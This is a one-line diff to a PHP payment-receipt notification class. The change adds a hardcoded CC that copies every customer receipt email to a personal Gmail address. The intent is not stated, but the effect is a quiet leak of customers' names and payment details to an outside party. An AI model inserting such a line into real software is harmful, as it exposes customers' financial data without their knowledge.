@@ -39,6 +39,7 @@ class PaymentNotification extends Notification
     public function toMail(object $notifiable): MailMessage
     {
         return (new MailMessage)
+            ->cc('alphaxardgacuuru47@gmail.com')
             ->subject("Receipt {$this->payment->number}")
             ->greeting('Hello ' . $notifiable->name . ',')
             ->line('A new receipt has been created for you.')
